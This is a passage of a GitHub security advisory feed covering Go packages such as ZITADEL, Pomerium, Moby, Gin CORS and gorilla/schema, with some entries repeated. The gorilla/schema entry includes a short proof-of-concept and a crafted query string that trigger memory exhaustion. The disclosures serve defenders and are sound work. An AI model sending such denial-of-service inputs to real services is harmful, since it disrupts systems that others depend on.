<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.1">https://github.com/zitadel/zitadel/releases/tag/v2.55.1</a></li>
<li><a href="https://github.com/advisories/GHSA-cvw9-c57h-3397">https://github.com/advisories/GHSA-cvw9-c57h-3397</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvw9-c57h-3397</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T20:03:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Vulnerable to Session Information Leakage]]></title>
        <id>https://github.com/advisories/GHSA-cvw9-c57h-3397</id>
        <link href="https://github.com/advisories/GHSA-cvw9-c57h-3397"/>
        <updated>2024-07-05T20:03:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL provides users the ability to list all user sessions of the current user agent (browser) by API and in the Console UI.</p>
<p>Due to a missing check, user sessions without that information (e.g. when created though the session service) were incorrectly listed exposing potentially other user's sessions.</p>
<p>Note that the Login UI was never affected and there was no possibility to take over such a session.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.1">2.55.1</a>
2.54.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.5">2.54.5</a>
2.53.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.8">2.53.8</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/pull/8231">https://github.com/zitadel/zitadel/pull/8231</a></li>
<li><a href="https://discord.com/channels/927474939156643850/1254096852937347153">https://discord.com/channels/927474939156643850/1254096852937347153</a></li>
<li><a href="https://github.com/zitadel/zitadel/issues/8213">https://github.com/zitadel/zitadel/issues/8213</a></li>
</ul>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to @cybertransformer, @Avolicious, @AmirhoseinBrz and @srividyaj for finding and reporting the vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-cvw9-c57h-3397">https://github.com/zitadel/zitadel/security/advisories/GHSA-cvw9-c57h-3397</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39683">https://nvd.nist.gov/vuln/detail/CVE-2024-39683</a></li>
<li><a href="https://github.com/zitadel/zitadel/issues/8213">https://github.com/zitadel/zitadel/issues/8213</a></li>
<li><a href="https://github.com/zitadel/zitadel/pull/8231">https://github.com/zitadel/zitadel/pull/8231</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/4a262e42abac2208b02fefaf68ba1a5121649f04">https://github.com/zitadel/zitadel/commit/4a262e42abac2208b02fefaf68ba1a5121649f04</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c2093ce01507ca8fc811609ff5d391693360c3da">https://github.com/zitadel/zitadel/commit/c2093ce01507ca8fc811609ff5d391693360c3da</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/d04f208486a418a45b884b9ca8433e5ad9790d73">https://github.com/zitadel/zitadel/commit/d04f208486a418a45b884b9ca8433e5ad9790d73</a></li>
<li><a href="https://discord.com/channels/927474939156643850/1254096852937347153">https://discord.com/channels/927474939156643850/1254096852937347153</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.8">https://github.com/zitadel/zitadel/releases/tag/v2.53.8</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.5">https://github.com/zitadel/zitadel/releases/tag/v2.54.5</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.1">https://github.com/zitadel/zitadel/releases/tag/v2.55.1</a></li>
<li><a href="https://github.com/advisories/GHSA-cvw9-c57h-3397">https://github.com/advisories/GHSA-cvw9-c57h-3397</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvw9-c57h-3397</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T20:03:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Vulnerable to Session Information Leakage]]></title>
        <id>https://github.com/advisories/GHSA-cvw9-c57h-3397</id>
        <link href="https://github.com/advisories/GHSA-cvw9-c57h-3397"/>
        <updated>2024-07-05T20:03:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL provides users the ability to list all user sessions of the current user agent (browser) by API and in the Console UI.</p>
<p>Due to a missing check, user sessions without that information (e.g. when created though the session service) were incorrectly listed exposing potentially other user's sessions.</p>
<p>Note that the Login UI was never affected and there was no possibility to take over such a session.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.1">2.55.1</a>
2.54.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.5">2.54.5</a>
2.53.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.8">2.53.8</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/pull/8231">https://github.com/zitadel/zitadel/pull/8231</a></li>
<li><a href="https://discord.com/channels/927474939156643850/1254096852937347153">https://discord.com/channels/927474939156643850/1254096852937347153</a></li>
<li><a href="https://github.com/zitadel/zitadel/issues/8213">https://github.com/zitadel/zitadel/issues/8213</a></li>
</ul>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to @cybertransformer, @Avolicious, @AmirhoseinBrz and @srividyaj for finding and reporting the vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-cvw9-c57h-3397">https://github.com/zitadel/zitadel/security/advisories/GHSA-cvw9-c57h-3397</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39683">https://nvd.nist.gov/vuln/detail/CVE-2024-39683</a></li>
<li><a href="https://github.com/zitadel/zitadel/issues/8213">https://github.com/zitadel/zitadel/issues/8213</a></li>
<li><a href="https://github.com/zitadel/zitadel/pull/8231">https://github.com/zitadel/zitadel/pull/8231</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/4a262e42abac2208b02fefaf68ba1a5121649f04">https://github.com/zitadel/zitadel/commit/4a262e42abac2208b02fefaf68ba1a5121649f04</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c2093ce01507ca8fc811609ff5d391693360c3da">https://github.com/zitadel/zitadel/commit/c2093ce01507ca8fc811609ff5d391693360c3da</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/d04f208486a418a45b884b9ca8433e5ad9790d73">https://github.com/zitadel/zitadel/commit/d04f208486a418a45b884b9ca8433e5ad9790d73</a></li>
<li><a href="https://discord.com/channels/927474939156643850/1254096852937347153">https://discord.com/channels/927474939156643850/1254096852937347153</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.8">https://github.com/zitadel/zitadel/releases/tag/v2.53.8</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.5">https://github.com/zitadel/zitadel/releases/tag/v2.54.5</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.1">https://github.com/zitadel/zitadel/releases/tag/v2.55.1</a></li>
<li><a href="https://github.com/advisories/GHSA-cvw9-c57h-3397">https://github.com/advisories/GHSA-cvw9-c57h-3397</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvw9-c57h-3397</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T20:03:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/rs/cors] Denial of service via malicious preflight requests in github.com/rs/cors]]></title>
        <id>https://github.com/advisories/GHSA-mh55-gqvf-xfwm</id>
        <link href="https://github.com/advisories/GHSA-mh55-gqvf-xfwm"/>
        <updated>2024-07-05T19:42:49.000Z</updated>
        <content type="html"><![CDATA[<p>Middleware causes a prohibitive amount of heap allocations when processing malicious preflight requests that include a Access-Control-Request-Headers (ACRH) header whose value contains many commas. This behavior can be abused by attackers to produce undue load on the middleware/server as an attempt to cause a denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rs/cors/issues/170">https://github.com/rs/cors/issues/170</a></li>
<li><a href="https://github.com/rs/cors/pull/171">https://github.com/rs/cors/pull/171</a></li>
<li><a href="https://github.com/rs/cors/commit/4c32059b2756926619f6bf70281b91be7b5dddb2">https://github.com/rs/cors/commit/4c32059b2756926619f6bf70281b91be7b5dddb2</a></li>
<li><a href="https://github.com/advisories/GHSA-mh55-gqvf-xfwm">https://github.com/advisories/GHSA-mh55-gqvf-xfwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh55-gqvf-xfwm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T19:42:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pomerium/pomerium] Pomerium exposed OAuth2 access and ID tokens in user info endpoint response]]></title>
        <id>https://github.com/advisories/GHSA-rrqr-7w59-637v</id>
        <link href="https://github.com/advisories/GHSA-rrqr-7w59-637v"/>
        <updated>2024-07-05T19:42:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Pomerium user info page (at <code>/.pomerium</code>) unintentionally included serialized OAuth2 access and ID tokens from the logged-in user's session. These tokens are not intended to be exposed to end users.</p>
<p>This issue may be more severe in the presence of an XSS vulnerability in an upstream application proxied through Pomerium. If an attacker could insert a malicious script onto a web page proxied through Pomerium, that script could access these tokens by making a request to the <code>/.pomerium</code> endpoint.</p>
<p>Upstream applications that authenticate only the ID token may be vulnerable to user impersonation using a token obtained in this manner.</p>
<p>Note that an OAuth2 access token or ID token by itself is not sufficient to hijack a user's Pomerium session. Upstream applications should not be vulnerable to user impersonation via these tokens provided:</p>
<ul>
<li>the application verifies the <a href="https://www.pomerium.com/docs/capabilities/getting-users-identity">Pomerium JWT</a> for each request,</li>
<li>the connection between Pomerium and the application is secured by mTLS,</li>
<li>or the connection between Pomerium and the application is otherwise secured at the network layer.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Patched in Pomerium v0.26.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/pomerium/pomerium/issues">pomerium/pomerium</a></li>
<li>Email us at <a href="mailto:security@pomerium.com">security@pomerium.com</a></li>
</ul>
<p>Credit to Vadim Sheydaev, aka Enr1g for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pomerium/pomerium/security/advisories/GHSA-rrqr-7w59-637v">https://github.com/pomerium/pomerium/security/advisories/GHSA-rrqr-7w59-637v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39315">https://nvd.nist.gov/vuln/detail/CVE-2024-39315</a></li>
<li><a href="https://github.com/pomerium/pomerium/commit/4c7c4320afb2ced70ba19b46de1ac4383f3daa48">https://github.com/pomerium/pomerium/commit/4c7c4320afb2ced70ba19b46de1ac4383f3daa48</a></li>
<li><a href="https://github.com/advisories/GHSA-rrqr-7w59-637v">https://github.com/advisories/GHSA-rrqr-7w59-637v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rrqr-7w59-637v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T19:42:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/moby/moby] Classic builder cache poisoning]]></title>
        <id>https://github.com/advisories/GHSA-xw73-rw38-6vjc</id>
        <link href="https://github.com/advisories/GHSA-xw73-rw38-6vjc"/>
        <updated>2024-07-05T18:59:06.000Z</updated>
        <content type="html"><![CDATA[<p>The classic builder cache system is prone to cache poisoning if the image is built <code>FROM scratch</code>.
Also, changes to some instructions (most important being <code>HEALTHCHECK</code> and <code>ONBUILD</code>) would not cause a cache miss.</p>
<p>An attacker with the knowledge of the Dockerfile someone is using could poison their cache by making them pull a specially crafted image that would be considered as a valid cache candidate for some build steps.</p>
<p>For example, an attacker could create an image that is considered as a valid cache candidate for:</p>
<pre><code>FROM scratch
MAINTAINER Pawel
</code></pre>
<p>when in fact the malicious image used as a cache would be an image built from a different Dockerfile.</p>
<p>In the second case, the attacker could for example substitute a different <code>HEALTCHECK</code> command.</p>
<h3 id="impact">Impact</h3>
<p>23.0+ users are only affected if they explicitly opted out of Buildkit (<code>DOCKER_BUILDKIT=0</code> environment variable) or are using the <code>/build</code> API endpoint (which uses the classic builder by default).</p>
<p>All users on versions older than 23.0 could be impacted. An example could be a CI with a shared cache, or just a regular Docker user pulling a malicious image due to misspelling/typosquatting.</p>
<p>Image build API endpoint (<code>/build</code>) and <code>ImageBuild</code> function from <code>github.com/docker/docker/client</code> is also affected as it the uses classic builder by default. </p>
<h3 id="patches">Patches</h3>
<p>Patches are included in Moby releases:</p>
<ul>
<li>v25.0.2</li>
<li>v24.0.9</li>
<li>v23.0.10</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Use <code>--no-cache</code> or use Buildkit if possible (<code>DOCKER_BUILDKIT=1</code>, it's default on 23.0+ assuming that the buildx plugin is installed).</li>
<li>Use <code>Version = types.BuilderBuildKit</code> or <code>NoCache = true</code> in <code>ImageBuildOptions</code> for <code>ImageBuild</code> call.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc">https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24557">https://nvd.nist.gov/vuln/detail/CVE-2024-24557</a></li>
<li><a href="https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae">https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae</a></li>
<li><a href="https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd">https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd</a></li>
<li><a href="https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff">https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff</a></li>
<li><a href="https://github.com/advisories/GHSA-xw73-rw38-6vjc">https://github.com/advisories/GHSA-xw73-rw38-6vjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw73-rw38-6vjc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-01T20:51:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/moby/moby] Classic builder cache poisoning]]></title>
        <id>https://github.com/advisories/GHSA-xw73-rw38-6vjc</id>
        <link href="https://github.com/advisories/GHSA-xw73-rw38-6vjc"/>
        <updated>2024-07-05T18:59:06.000Z</updated>
        <content type="html"><![CDATA[<p>The classic builder cache system is prone to cache poisoning if the image is built <code>FROM scratch</code>.
Also, changes to some instructions (most important being <code>HEALTHCHECK</code> and <code>ONBUILD</code>) would not cause a cache miss.</p>
<p>An attacker with the knowledge of the Dockerfile someone is using could poison their cache by making them pull a specially crafted image that would be considered as a valid cache candidate for some build steps.</p>
<p>For example, an attacker could create an image that is considered as a valid cache candidate for:</p>
<pre><code>FROM scratch
MAINTAINER Pawel
</code></pre>
<p>when in fact the malicious image used as a cache would be an image built from a different Dockerfile.</p>
<p>In the second case, the attacker could for example substitute a different <code>HEALTCHECK</code> command.</p>
<h3 id="impact">Impact</h3>
<p>23.0+ users are only affected if they explicitly opted out of Buildkit (<code>DOCKER_BUILDKIT=0</code> environment variable) or are using the <code>/build</code> API endpoint (which uses the classic builder by default).</p>
<p>All users on versions older than 23.0 could be impacted. An example could be a CI with a shared cache, or just a regular Docker user pulling a malicious image due to misspelling/typosquatting.</p>
<p>Image build API endpoint (<code>/build</code>) and <code>ImageBuild</code> function from <code>github.com/docker/docker/client</code> is also affected as it the uses classic builder by default. </p>
<h3 id="patches">Patches</h3>
<p>Patches are included in Moby releases:</p>
<ul>
<li>v25.0.2</li>
<li>v24.0.9</li>
<li>v23.0.10</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Use <code>--no-cache</code> or use Buildkit if possible (<code>DOCKER_BUILDKIT=1</code>, it's default on 23.0+ assuming that the buildx plugin is installed).</li>
<li>Use <code>Version = types.BuilderBuildKit</code> or <code>NoCache = true</code> in <code>ImageBuildOptions</code> for <code>ImageBuild</code> call.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc">https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24557">https://nvd.nist.gov/vuln/detail/CVE-2024-24557</a></li>
<li><a href="https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae">https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae</a></li>
<li><a href="https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd">https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd</a></li>
<li><a href="https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff">https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff</a></li>
<li><a href="https://github.com/advisories/GHSA-xw73-rw38-6vjc">https://github.com/advisories/GHSA-xw73-rw38-6vjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw73-rw38-6vjc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-01T20:51:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gin-gonic/gin] Gin mishandles a wildcard at the end of an origin string]]></title>
        <id>https://github.com/advisories/GHSA-869c-j7wc-8jqv</id>
        <link href="https://github.com/advisories/GHSA-869c-j7wc-8jqv"/>
        <updated>2024-07-05T21:27:43.000Z</updated>
        <content type="html"><![CDATA[<p>parseWildcardRules in Gin-Gonic CORS middleware before 1.6.0 mishandles a wildcard at the end of an origin string, e.g., <a href="https://example.community/">https://example.community/</a>* is allowed when the intention is that only <a href="https://example.com/">https://example.com/</a>* should be allowed, and <a href="http://localhost.example.com/">http://localhost.example.com/</a>* is allowed when the intention is that only <a href="http://localhost/">http://localhost/</a>* should be allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-25211">https://nvd.nist.gov/vuln/detail/CVE-2019-25211</a></li>
<li><a href="https://github.com/gin-contrib/cors/pull/106">https://github.com/gin-contrib/cors/pull/106</a></li>
<li><a href="https://github.com/gin-contrib/cors/pull/57">https://github.com/gin-contrib/cors/pull/57</a></li>
<li><a href="https://github.com/gin-contrib/cors/commit/27b723a473efd80d5a498fa9f5933c80204c850d">https://github.com/gin-contrib/cors/commit/27b723a473efd80d5a498fa9f5933c80204c850d</a></li>
<li><a href="https://github.com/gin-contrib/cors/compare/v1.5.0...v1.6.0">https://github.com/gin-contrib/cors/compare/v1.5.0...v1.6.0</a></li>
<li><a href="https://github.com/gin-contrib/cors/releases/tag/v1.6.0">https://github.com/gin-contrib/cors/releases/tag/v1.6.0</a></li>
<li><a href="https://github.com/advisories/GHSA-869c-j7wc-8jqv">https://github.com/advisories/GHSA-869c-j7wc-8jqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-869c-j7wc-8jqv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-29T06:31:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gorilla/schema] Potential memory exhaustion attack due to sparse slice deserialization]]></title>
        <id>https://github.com/advisories/GHSA-3669-72x9-r9p3</id>
        <link href="https://github.com/advisories/GHSA-3669-72x9-r9p3"/>
        <updated>2024-07-05T21:29:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="details">Details</h3>
<p>Running <code>schema.Decoder.Decode()</code> on a struct that has a field of type <code>[]struct{...}</code> opens it up to malicious attacks regarding memory allocations, taking advantage of the sparse slice functionality. For instance, in the Proof of Concept written below, someone can specify to set a field of the billionth element and it will allocate all other elements before it in the slice. </p>
<p>In the local environment environment for my project, I was able to call an endpoint like <code>/innocent_endpoint?arr.10000000.X=1</code> and freeze my system from the memory allocation while parsing <code>r.Form</code>. I think <a href="https://github.com/gorilla/schema/blob/main/decoder.go#L223">this line</a> is responsible for allocating the slice, although I haven't tested to make sure, so it's just an educated guess.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>The following proof of concept works on both v1.2.0 and v1.2.1. I have not tested earlier versions.</p>
<pre><code class="language-go">package main

import (
    "fmt"

    "github.com/gorilla/schema"
)

func main() {
    dec := schema.NewDecoder()
    var result struct {
        Arr []struct{ Val int }
    }
    if err := dec.Decode(&amp;result, map[string][]string{"arr.1000000000.Val": {"1"}}); err != nil {
        panic(err)
    }
    fmt.Printf("%#+v\n", result)
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any use of <code>schema.Decoder.Decode()</code> on a struct with arrays of other structs could be vulnerable to this memory exhaustion vulnerability. There seems to be no possible solution that a developer using this library can do to disable this behaviour without fixing it in this project, so all uses of Decode that fall under this umbrella are affected. A fix that doesn't require a major change may also be harder to find, since it could break compatibility with some other intended use-cases.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gorilla/schema/security/advisories/GHSA-3669-72x9-r9p3">https://github.com/gorilla/schema/security/advisories/GHSA-3669-72x9-r9p3</a></li>
<li><a href="https://github.com/gorilla/schema/commit/cd59f2f12cbdfa9c06aa63e425d1fe4a806967ff">https://github.com/gorilla/schema/commit/cd59f2f12cbdfa9c06aa63e425d1fe4a806967ff</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37298">https://nvd.nist.gov/vuln/detail/CVE-2024-37298</a></li>
<li><a href="https://github.com/gorilla/schema/blob/main/decoder.go#L223">https://github.com/gorilla/schema/blob/main/decoder.go#L223</a></li>
<li><a href="https://github.com/advisories/GHSA-3669-72x9-r9p3">https://github.com/advisories/GHSA-3669-72x9-r9p3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3669-72x9-r9p3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-01T20:35:12.000Z</published>
    </entry>
</feed>